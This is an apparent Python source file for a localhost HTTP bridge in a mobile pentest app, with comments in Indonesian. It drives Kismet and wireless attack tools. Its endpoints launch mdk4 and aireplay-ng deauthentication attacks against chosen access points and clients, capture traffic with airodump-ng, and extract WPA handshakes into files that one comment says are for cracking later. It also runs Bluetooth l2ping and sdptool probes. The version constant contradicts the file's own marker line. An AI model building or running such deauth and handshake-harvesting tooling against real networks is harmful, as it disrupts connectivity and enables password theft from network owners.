# ASTRO_KISMET_TOOLS_BRIDGE_VERSION = 3
#!/usr/bin/env python3
"""Astro Kismet tools bridge — Fase 1 (2026-11-02).

Bridge chroot Python untuk integrasi WebUI Kismet x alat mentah
(mdk4 / aireplay-ng / airodump-ng / l2ping / sdptool). Pola delivery
SAMA seperti bridge Frida: asset -> filesDir -> chroot /tmp,
dijalankan nohup + log, localhost saja + token sesi acak.

Keamanan (aturan keras, dari diskusi 2026-11-01/02):
- Bind 127.0.0.1 SAJA — tidak pernah ke semua interface.
- Token sesi acak per start (env ASTRO_KISMET_TOOLS_TOKEN, dibuat
  manager Java). Tanpa token yang cocok, semua endpoint kecuali
  /health menjawab 401. Token TIDAK PERNAH dicetak ke log atau URL.
- Fail closed: bila env token kosong/tidak ada, proses menolak
  start (exit 2).
- SIGSTOP HANYA untuk PID dari `pidof kismet` — tidak pernah proses
  lain. SIGCONT di finally job + watchdog atexit/signal — Kismet
  tidak boleh tertinggal beku (kecuali SIGKILL, yang tidak bisa
  ditangkap: manager Java WAJIB CONT saat stop).
- Aksi WiFi HANYA pada MAC yang dipilih pengguna (deauth tertarget
  via blacklist file / -a/-c, bukan broadcast buta).
- Durasi dibatasi (default 30 detik, maks 300) + tombol stop untuk
  job panjang — tidak ada flood/attack tanpa batas.
- Aksi WiFi fail-fast bila Kismet tidak jalan (panel Start dulu):
  tanpa Kismet, wlan0 belum tentu monitor. Aksi BT tidak butuh
  Kismet sama sekali (radio hci0 terpisah).
- Hanya stdlib. Tidak ada aset remote, tidak ada halaman HTML di
  Fase 1 (WebUI Kismet sendiri yang memanggil endpoint ini di
  Fase 2).
- CORS: halaman WebUI berasal dari http://127.0.0.1:2501 sedangkan
  bridge di :18082 — port berbeda = cross-origin, jadi browser
  mengirim preflight OPTIONS. Bridge menjawab preflight + header
  Allow-Origin khusus origin WebUI itu. Token tetap wajib untuk
  semua endpoint kecuali /health; CORS bukan pengganti token.

v4 (2026-11-03): aksi WiFi TIDAK LAGI freeze + iw set channel —
iw terbukti tidak nempel di perangkat (minta 4, terbaca 7 sesudah
3x) dan melawan hopping Kismet. Sebagai gantinya, JS mengunci
channel lewat API bawaan Kismet (set_channel.cmd) SEBELUM
memanggil bridge; bridge menjalankan tool TANPA freeze, TANPA
iw, dan TANPA down interface — interface tidak pernah di-down
di jalur mana pun. Sesudah job selesai/dihentikan, JS
menghidupkan hopping lagi (set_hop.cmd). focus_channel tetap
set + baca balik + ulang 3x (temuan PoC 2026-11-02) — kini
hanya dipakai /kismet/freeze manual, bukan jalur aksi.

Bundle SSID+mdk4+handshake (2026-11-03, marker 2->3 supaya manager
menimpa bridge lama saat tools Start): JS membedakan tap AP vs
client (client hanya aireplay surgical -a AP -c client; mdk4 tidak
ditawarkan untuk client); endpoint handshake baru di bawah
mengekstrak handshake dari pcapng panel Kismet ke folder daftar
handshake Astro (/sdcard/Astro/captured — direktori yang sama
dengan yang dibaca HandshakeStorage, jadi file langsung muncul
di daftar tanpa langkah salin). Ekstraksi TIDAK butuh Kismet
jalan (membaca log) dan TIDAK butuh kunci channel. Tool:
hcxpcapngtool dulu (hasil terverifikasi .hc22000), fallback
tshark (EAPOL saja, belum terverifikasi); bila keduanya tidak
ada, endpoint gagal terlihat (bukan file kosong).

Endpoint (semua bertoken kecuali /health):
- GET  /health                 (tanpa token, liveness saja)
- GET  /status                 (kismet pid, beku?, channel, jobs)
- POST /kismet/freeze          {channel} -> STOP + fokus channel
- POST /kismet/resume          {} -> CONT (ditolak bila ada job)
- POST /wifi/deauth/mdk4       {bssid, channel, duration,
                                kismet_locked: true}
- POST /wifi/deauth/aireplay   {bssid, client?, count?, channel,
                                duration, kismet_locked: true}
- POST /wifi/capture/airodump  {bssid?, channel, duration?,
                                kismet_locked: true}
- POST /wifi/handshake/extract {bssid, client?} -> file di captured/
- POST /bt/l2ping              {mac, count?}
- POST /bt/sdptool             {mac}
- GET  /jobs                   (daftar job)
- POST /jobs/stop              {id} -> hentikan job

Jalan: ASTRO_KISMET_TOOLS_TOKEN=<token> python3
  /tmp/astro_kismet_tools_bridge.py
Log: /tmp/astro_kismet_tools_bridge.log (dialihkan perintah start).
Berhenti: pkill -f astro_kismet_tools_bridge.py (dari manager,
  SETELAH CONT bila beku — manager wajib resume dulu).
"""

import atexit
import glob
import json
import os
import re
import shutil
import signal
import subprocess
import sys
import threading
import time
import urllib.parse
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

HOST = "127.0.0.1"
PORT = 18082
SESSION_TOKEN = os.environ.get("ASTRO_KISMET_TOOLS_TOKEN", "")
# Angka ini HARUS sama dengan marker komentar di baris 1 — manager
# Java membaca marker itu untuk memutuskan overwrite filesDir.
BRIDGE_VERSION = 1
TOKEN_HEADER = "X-Astro-Token"
WLAN_IF = "wlan0"
WORK_DIR = "/tmp/astro_kismet_tools"
KISMET_LOG_DIR = "/tmp/astro_kismet"
HS_OUT_DIR = "/sdcard/Astro/captured"
MAX_BODY = 64 * 1024
FOCUS_RETRIES = 3
FOCUS_SLEEP_SEC = 0.5
DEFAULT_DURATION_SEC = 30
MAX_DURATION_SEC = 300

MAC_RE = re.compile(r"^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$")
CHANNELS_5GHZ = {
    36, 40, 44, 48, 52, 56, 60, 64, 100, 104, 108, 112, 116, 120,
    124, 128, 132, 136, 140, 144, 149, 153, 157, 161, 165,
}


def log(msg):
    sys.stdout.write("[%s] %s\n" % (time.strftime("%H:%M:%S"), msg))
    sys.stdout.flush()


def valid_mac(mac):
    return isinstance(mac, str) and MAC_RE.match(mac) is not None


def valid_channel(ch):
    return (
        isinstance(ch, int)
        and not isinstance(ch, bool)
        and (1 <= ch <= 14 or ch in CHANNELS_5GHZ)
    )


def clamp_duration(d):
    try:
        d = int(d)
    except (TypeError, ValueError):
        return DEFAULT_DURATION_SEC
    return max(1, min(MAX_DURATION_SEC, d))


def run_cmd(argv, timeout=15):
    """Jalankan perintah, kembalikan (rc, stdout, stderr). FileNotFound
    (tool belum terinstal) menjadi rc 127 + pesan, bukan crash."""
    try:
        p = subprocess.run(
            argv, capture_output=True, text=True, timeout=timeout
        )
        return p.returncode, p.stdout or "", p.stderr or ""
    except FileNotFoundError:
        return 127, "", "perintah tidak ditemukan: %s" % argv[0]
    except subprocess.TimeoutExpired:
        return 124, "", "perintah timeout: %s" % " ".join(argv)


def kismet_pids():
    rc, out, _ = run_cmd(["pidof", "kismet"])
    if rc != 0:
        return []
    pids = []
    for tok in out.split():
        try:
            pids.append(int(tok))
        except ValueError:
            pass
    return pids


def iw_channel():
    """Channel wlan0 saat ini, atau None bila tidak terbaca."""
    rc, out, _ = run_cmd(["iw", "dev", WLAN_IF, "info"])
    if rc != 0:
        return None
    m = re.search(r"channel (\d+) \(", out)
    return int(m.group(1)) if m else None


def focus_channel(channel):
    """Set channel + baca balik + ulangi sampai cocok (maks 3x).
    Mengembalikan (ok, channel_terbaca_atau_None, pesan)."""
    last = None
    for _ in range(FOCUS_RETRIES):
        rc, _, err = run_cmd(["iw", "dev", WLAN_IF, "set", "channel",
                              str(channel)])
        if rc != 0:
            return False, None, "iw set channel gagal: %s" % err.strip()
        time.sleep(FOCUS_SLEEP_SEC)
        last = iw_channel()
        if last == channel:
            return True, last, "ok"
    return False, last, (
        "channel tidak nempel: minta %d, terbaca %s sesudah %dx"
        % (channel, last, FOCUS_RETRIES)
    )


# ---------------------------------------------------------------- freeze
# State beku bridge-level: frozen=True berarti Kismet sedang STOP.
# refs = jumlah job WiFi yang menahan beku; manual = freeze manual
# (/kismet/freeze) yang menahan beku di luar job. CONT hanya terjadi
# bila refs == 0 DAN manual == False — jadi job yang selesai tidak
# akan mencairkan freeze manual, dan resume manual tidak akan
# mencairkan job yang masih jalan.

class FreezeState:
    def __init__(self):
        self.lock = threading.Lock()
        self.frozen = False
        self.refs = 0
        self.manual = False

    def acquire(self, manual=False):
        """STOP Kismet bila belum beku; lalu tahan (ref/manual).
        Mengembalikan (ok, pesan)."""
        with self.lock:
            if not self.frozen:
                pids = kismet_pids()
                if not pids:
                    return False, (
                        "Kismet tidak jalan — Start dari panel dulu"
                    )
                rc, _, err = run_cmd(
                    ["kill", "-STOP"] + [str(p) for p in pids]
                )
                if rc != 0:
                    return False, "kill -STOP gagal: %s" % err.strip()
                self.frozen = True
            if manual:
                self.manual = True
            else:
                self.refs += 1
            return True, "ok"

    def release(self, manual=False):
        """Lepas satu tahanan; CONT bila tidak ada tahanan tersisa."""
        with self.lock:
            if manual:
                self.manual = False
            elif self.refs > 0:
                self.refs -= 1
            if self.frozen and self.refs == 0 and not self.manual:
                pids = kismet_pids()
                if pids:
                    run_cmd(["kill", "-CONT"] + [str(p) for p in pids])
                self.frozen = False
            return True, "ok"

    def force_cont(self):
        """Watchdog: CONT tanpa syarat (atexit/signal)."""
        with self.lock:
            if self.frozen:
                pids = kismet_pids()
                if pids:
                    run_cmd(["kill", "-CONT"] + [str(p) for p in pids])
                self.frozen = False
                self.refs = 0
                self.manual = False


FREEZE = FreezeState()


def _watchdog(signum, frame):
    FREEZE.force_cont()
    sys.exit(0)


# ---------------------------------------------------------------- jobs
class JobStore:
    def __init__(self):
        self.lock = threading.Lock()
        self.jobs = {}
        self.next_id = 1

    def start(self, kind, target, argv, holds_freeze, duration=None):
        with self.lock:
            jid = self.next_id
            self.next_id += 1
        try:
            proc = subprocess.Popen(
                argv, stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
            )
        except FileNotFoundError as e:
            return None, "perintah tidak ditemukan: %s" % argv[0]
        job = {
            "id": jid, "kind": kind, "target": target,
            "argv": argv, "proc": proc, "running": True,
            "holds_freeze": holds_freeze,
            "started": time.time(),
        }
        with self.lock:
            self.jobs[jid] = job
        threading.Thread(target=self._watch, args=(job,),
                         daemon=True).start()
        if duration:
            threading.Thread(target=self._timer, args=(job, duration),
                             daemon=True).start()
        return job, "ok"

    def _watch(self, job):
        job["proc"].wait()
        with self.lock:
            job["running"] = False
        if job["holds_freeze"]:
            FREEZE.release(manual=False)

    def _timer(self, job, duration):
        time.sleep(duration)
        self.stop(job["id"])

    def stop(self, jid):
        with self.lock:
            job = self.jobs.get(jid)
        if job is None:
            return False, "job tidak ditemukan: %s" % jid
        if not job["running"]:
            return True, "job sudah berhenti"
        proc = job["proc"]
        proc.terminate()
        try:
            proc.wait(timeout=2)
        except subprocess.TimeoutExpired:
            proc.kill()
            proc.wait()
        with self.lock:
            job["running"] = False
        if job["holds_freeze"]:
            FREEZE.release(manual=False)
        return True, "ok"

    def listing(self):
        with self.lock:
            return [
                {
                    "id": j["id"], "kind": j["kind"],
                    "target": j["target"], "running": j["running"],
                    "started": j["started"],
                }
                for j in sorted(self.jobs.values(), key=lambda x: x["id"])
            ]


JOBS = JobStore()


def wifi_prep(channel):
    """Persiapan bersama aksi WiFi: freeze + fokus channel.
    Mengembalikan (ok, pesan). Pemanggil WAJIB release() bila gagal
    sesudah acquire berhasil (lihat tiap handler)."""
    ok, msg = FREEZE.acquire(manual=False)
    if not ok:
        return False, msg
    ok, read, msg = focus_channel(channel)
    if not ok:
        FREEZE.release(manual=False)
        return False, msg
    return True, "ok"


def start_wifi_job(kind, target, argv, channel, duration,
                   locked=False):
    """Start job WiFi. v4: bila locked=True, channel SUDAH dikunci
    Kismet via API-nya (oleh JS) — bridge TIDAK freeze, TIDAK iw,
    TIDAK down interface; hanya pastikan Kismet jalan. Bila
    locked=False, tolak eksplisit: jalur freeze+iw lama terbukti
    tidak nempel di perangkat, jadi tidak lagi dipakai diam-diam
    (pesan ini tidak boleh muncul pada JS v4 — JS selalu mengunci
    dulu sebelum memanggil bridge)."""
    if locked:
        if not kismet_pids():
            return None, "Kismet tidak jalan — Start dari panel dulu"
        job, msg = JOBS.start(kind, target, argv, False, duration)
        if job is None:
            return None, msg
        return job, "ok"
    return None, ("channel belum dikunci via API Kismet — "
                  "kunci dulu lewat menu (otomatis saat tap aksi)")


# ---------------------------------------------------------------- http
class Handler(BaseHTTPRequestHandler):
    protocol_version = "HTTP/1.1"

    def log_message(self, *args):
        pass  # log ditulis manual (tanpa token, tanpa body)

    def _send(self, code, obj):
        body = json.dumps(obj).encode("utf-8")
        self.send_response(code)
        self.send_header("Content-Type", "application/json")
        self.send_header("Access-Control-Allow-Origin",
                         "http://127.0.0.1:2501")
        self.send_header("Access-Control-Allow-Headers",
                         "X-Astro-Token, Content-Type")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def do_OPTIONS(self):
        # Preflight CORS dari WebUI :2501 — tanpa token (browser
        # tidak mengirim header custom saat preflight).
        self.send_response(204)
        self.send_header("Access-Control-Allow-Origin",
                         "http://127.0.0.1:2501")
        self.send_header("Access-Control-Allow-Headers",
                         "X-Astro-Token, Content-Type")
        self.send_header("Access-Control-Allow-Methods",
                         "GET, POST, OPTIONS")
        self.send_header("Content-Length", "0")
        self.end_headers()

    def _body(self):
        try:
            n = int(self.headers.get("Content-Length") or 0)
        except ValueError:
            n = 0
        if n <= 0 or n > MAX_BODY:
            return {}
        raw = self.rfile.read(n)
        try:
            obj = json.loads(raw.decode("utf-8"))
        except (ValueError, UnicodeDecodeError):
            return {}
        return obj if isinstance(obj, dict) else {}

    def _auth(self):
        return self.headers.get(TOKEN_HEADER) == SESSION_TOKEN

    def do_GET(self):
        path = urllib.parse.urlparse(self.path).path
        if path == "/health":
            self._send(200, {"ok": True, "version": BRIDGE_VERSION})
            return
        if not self._auth():
            self._send(401, {"ok": False, "error": "token salah"})
            return
        if path == "/status":
            self._send(200, {
                "ok": True,
                "kismet_pids": kismet_pids(),
                "frozen": FREEZE.frozen,
                "freeze_refs": FREEZE.refs,
                "freeze_manual": FREEZE.manual,
                "channel": iw_channel(),
                "jobs": JOBS.listing(),
            })
        elif path == "/jobs":
            self._send(200, {"ok": True, "jobs": JOBS.listing()})
        else:
            self._send(404, {"ok": False, "error": "tidak dikenal"})
        log("GET %s -> %s" % (path, "ok"))

    def do_POST(self):
        path = urllib.parse.urlparse(self.path).path
        if not self._auth():
            self._send(401, {"ok": False, "error": "token salah"})
            return
        body = self._body()
        try:
            if path == "/kismet/freeze":
                self._freeze(body)
            elif path == "/kismet/resume":
                self._resume()
            elif path == "/wifi/deauth/mdk4":
                self._mdk4(body)
            elif path == "/wifi/deauth/aireplay":
                self._aireplay(body)
            elif path == "/wifi/capture/airodump":
                self._airodump(body)
            elif path == "/wifi/handshake/extract":
                self._handshake(body)
            elif path == "/bt/l2ping":
                self._l2ping(body)
            elif path == "/bt/sdptool":
                self._sdptool(body)
            elif path == "/jobs/stop":
                self._job_stop(body)
            else:
                self._send(404, {"ok": False, "error": "tidak dikenal"})
        except BrokenPipeError:
            pass
        except Exception as e:  # endpoint gagal jelas, bukan crash
            self._send(500, {"ok": False, "error": "gagal: %s" % e})
        log("POST %s -> selesai" % path)

    def _freeze(self, body):
        channel = body.get("channel")
        if not valid_channel(channel):
            self._send(400, {"ok": False,
                             "error": "channel tidak valid"})
            return
        ok, msg = FREEZE.acquire(manual=True)
        if not ok:
            self._send(409, {"ok": False, "error": msg})
            return
        ok, read, msg = focus_channel(channel)
        if not ok:
            FREEZE.release(manual=True)
            self._send(409, {"ok": False, "error": msg})
            return
        self._send(200, {"ok": True, "frozen": True, "channel": read})

    def _resume(self):
        if FREEZE.refs > 0:
            self._send(409, {
                "ok": False,
                "error": "masih ada %d job WiFi berjalan" % FREEZE.refs,
            })
            return
        FREEZE.release(manual=True)
        self._send(200, {"ok": True, "frozen": False})

    def _mdk4(self, body):
        bssid = body.get("bssid", "")
        channel = body.get("channel")
        duration = clamp_duration(body.get("duration"))
        if not valid_mac(bssid):
            self._send(400, {"ok": False, "error": "BSSID tidak valid"})
            return
        if not valid_channel(channel):
            self._send(400, {"ok": False,
                             "error": "channel tidak valid"})
            return
        os.makedirs(WORK_DIR, exist_ok=True)
        bl_path = os.path.join(WORK_DIR, "blacklist.txt")
        with open(bl_path, "w") as f:
            f.write(bssid.upper() + "\n")
        job, msg = start_wifi_job(
            "mdk4-deauth", bssid,
            ["mdk4", WLAN_IF, "d", "-b", bl_path],
            channel, duration,
            locked=bool(body.get("kismet_locked")),
        )
        if job is None:
            self._send(409, {"ok": False, "error": msg})
            return
        self._send(200, {"ok": True, "job": job["id"],
                         "kind": "mdk4-deauth", "target": bssid,
                         "duration": duration})

    def _aireplay(self, body):
        bssid = body.get("bssid", "")
        client = body.get("client", "")
        count = body.get("count", 0)
        channel = body.get("channel")
        duration = clamp_duration(body.get("duration"))
        if not valid_mac(bssid):
            self._send(400, {"ok": False, "error": "BSSID tidak valid"})
            return
        if client and not valid_mac(client):
            self._send(400, {"ok": False, "error": "client tidak valid"})
            return
        if not valid_channel(channel):
            self._send(400, {"ok": False,
                             "error": "channel tidak valid"})
            return
        try:
            count = int(count)
        except (TypeError, ValueError):
            count = 0
        argv = ["aireplay-ng", "-0", str(max(0, count)), "-a",
                bssid.upper()]
        if client:
            argv += ["-c", client.upper()]
        argv.append(WLAN_IF)
        job, msg = start_wifi_job(
            "aireplay-deauth", bssid, argv, channel, duration,
            locked=bool(body.get("kismet_locked")),
        )
        if job is None:
            self._send(409, {"ok": False, "error": msg})
            return
        self._send(200, {"ok": True, "job": job["id"],
                         "kind": "aireplay-deauth", "target": bssid,
                         "duration": duration})

    def _airodump(self, body):
        bssid = body.get("bssid", "")
        channel = body.get("channel")
        duration = body.get("duration")
        if bssid and not valid_mac(bssid):
            self._send(400, {"ok": False, "error": "BSSID tidak valid"})
            return
        if not valid_channel(channel):
            self._send(400, {"ok": False,
                             "error": "channel tidak valid"})
            return
        os.makedirs(WORK_DIR, exist_ok=True)
        prefix = os.path.join(
            WORK_DIR, "cap-%d" % int(time.time()))
        argv = ["airodump-ng", "-c", str(channel), "-w", prefix]
        if bssid:
            argv += ["--bssid", bssid.upper()]
        argv.append(WLAN_IF)
        dur = clamp_duration(duration) if duration else None
        job, msg = start_wifi_job(
            "airodump", bssid or "semua", argv, channel, dur,
            locked=bool(body.get("kismet_locked")),
        )
        if job is None:
            self._send(409, {"ok": False, "error": msg})
            return
        self._send(200, {"ok": True, "job": job["id"],
                         "kind": "airodump", "prefix": prefix})

    def _handshake(self, body):
        bssid = body.get("bssid", "")
        client = body.get("client", "")
        if not valid_mac(bssid):
            self._send(400, {"ok": False, "error": "BSSID tidak valid"})
            return
        if client and not valid_mac(client):
            self._send(400, {"ok": False, "error": "client tidak valid"})
            return
        # Sengaja TIDAK cek Kismet jalan: ekstraksi membaca file
        # log, jadi bisa sesudah Stop; snapshot saat dibaca (bila
        # client reconnect SESUDAH ekstraksi, tap tombolnya lagi).
        files = sorted(
            glob.glob(os.path.join(KISMET_LOG_DIR, "*.pcapng")),
            key=os.path.getmtime)
        if not files:
            self._send(404, {"ok": False,
                             "error": "tidak ada file pcapng di /tmp/astro_kismet"})
            return
        src = files[-1]
        try:
            os.makedirs(WORK_DIR, exist_ok=True)
            os.makedirs(HS_OUT_DIR, exist_ok=True)
        except Exception as e:
            self._send(500, {"ok": False,
                             "error": "folder kerja tidak bisa dibuat: %s" % e})
            return
        ts = time.strftime("%Y%m%d-%H%M%S")
        ap_hex = bssid.replace(":", "").lower()
        client_hex = client.replace(":", "").lower() if client else ""
        # 1. hcxpcapngtool -> .hc22000 terverifikasi. Garis harus
        # mengandung MAC target; untuk client: AP DAN client
        # (handshake client itu spesifik, bukan sembarang client).
        tmp_all = os.path.join(WORK_DIR, "hs-all.hc22000")
        rc, _, _ = run_cmd(
            ["hcxpcapngtool", "-o", tmp_all, src], timeout=300)
        if rc == 0:
            try:
                with open(tmp_all, "r", errors="replace") as f:
                    hits = [ln.rstrip("\n") for ln in f
                            if ap_hex in ln.lower()
                            and (not client_hex
                                 or client_hex in ln.lower())]
            except OSError:
                hits = []
            if hits:
                fname = "%s_%s.hc22000" % (bssid.upper(), ts)
                try:
                    with open(os.path.join(HS_OUT_DIR, fname), "w") as f:
                        f.write("\n".join(hits) + "\n")
                except OSError as e:
                    self._send(500, {"ok": False,
                                     "error": "gagal menulis %s: %s" % (fname, e)})
                    return
                self._send(200, {"ok": True, "file": fname,
                                 "verified": True, "tool": "hcxpcapngtool",
                                 "count": len(hits)})
                return
        # 2. Fallback tshark: EAPOL saja, BELUM terverifikasi
        # handshake lengkap (file tetap berguna untuk crack nanti).
        tmp_cap = os.path.join(WORK_DIR, "hs-filter.pcapng")
        filt = ("(wlan.bssid == %s || wlan.sa == %s || wlan.da == %s)"
                " && eapol" % (bssid.lower(), bssid.lower(), bssid.lower()))
        if client_hex:
            filt = ("(%s) && (wlan.sa == %s || wlan.da == %s)"
                    % (filt, client.lower(), client.lower()))
        rc, _, _ = run_cmd(
            ["tshark", "-r", src, "-Y", filt, "-w", tmp_cap], timeout=300)
        if rc == 0 and os.path.exists(tmp_cap):
            rc2, pktout, _ = run_cmd(
                ["tshark", "-r", tmp_cap, "-T", "fields", "-e", "frame.number"],
                timeout=60)
            n = len([l for l in pktout.splitlines() if l.strip()]) \
                if rc2 == 0 else 0
            if n > 0:
                fname = "%s_%s.pcapng" % (bssid.upper(), ts)
                try:
                    shutil.copyfile(tmp_cap, os.path.join(HS_OUT_DIR, fname))
                except OSError as e:
                    self._send(500, {"ok": False,
                                     "error": "gagal menyalin %s: %s" % (fname, e)})
                    return
                self._send(200, {"ok": True, "file": fname,
                                 "verified": False, "tool": "tshark",
                                 "packets": n,
                                 "note": "EAPOL saja, belum terverifikasi "
                                         "handshake lengkap"})
                return
        self._send(404, {"ok": False,
                         "error": "tidak ada handshake untuk %s di capture ini "
                         "(client mungkin belum reconnect — deauth dulu lalu "
                         "ambil lagi), atau hcxpcapngtool/tshark tidak "
                         "tersedia" % bssid})

    def _l2ping(self, body):
        mac = body.get("mac", "")
        try:
            count = max(1, min(20, int(body.get("count", 4))))
        except (TypeError, ValueError):
            count = 4
        if not valid_mac(mac):
            self._send(400, {"ok": False, "error": "MAC tidak valid"})
            return
        rc, out, err = run_cmd(["l2ping", "-c", str(count), mac],
                               timeout=30)
        if rc != 0:
            self._send(409, {"ok": False,
                             "error": (err.strip() or out.strip()
                                       or "l2ping gagal")})
            return
        self._send(200, {"ok": True, "output": out.strip()})

    def _sdptool(self, body):
        mac = body.get("mac", "")
        if not valid_mac(mac):
            self._send(400, {"ok": False, "error": "MAC tidak valid"})
            return
        rc, out, err = run_cmd(["sdptool", "browse", mac], timeout=30)
        if rc != 0:
            self._send(409, {"ok": False,
                             "error": (err.strip() or out.strip()
                                       or "sdptool gagal")})
            return
        self._send(200, {"ok": True, "output": out.strip()})

    def _job_stop(self, body):
        try:
            jid = int(body.get("id"))
        except (TypeError, ValueError):
            self._send(400, {"ok": False, "error": "id tidak valid"})
            return
        ok, msg = JOBS.stop(jid)
        self._send(200 if ok else 404, {"ok": ok, "message": msg})


def main():
    if not SESSION_TOKEN:
        sys.stderr.write("ASTRO_KISMET_TOOLS_TOKEN kosong — menolak start\n")
        sys.exit(2)
    atexit.register(FREEZE.force_cont)
    signal.signal(signal.SIGTERM, _watchdog)
    signal.signal(signal.SIGINT, _watchdog)
    server = ThreadingHTTPServer((HOST, PORT), Handler)
    log("bridge jalan di %s:%d (versi %d)" % (HOST, PORT,
                                              BRIDGE_VERSION))
    server.serve_forever()


if __name__ == "__main__":
    main()
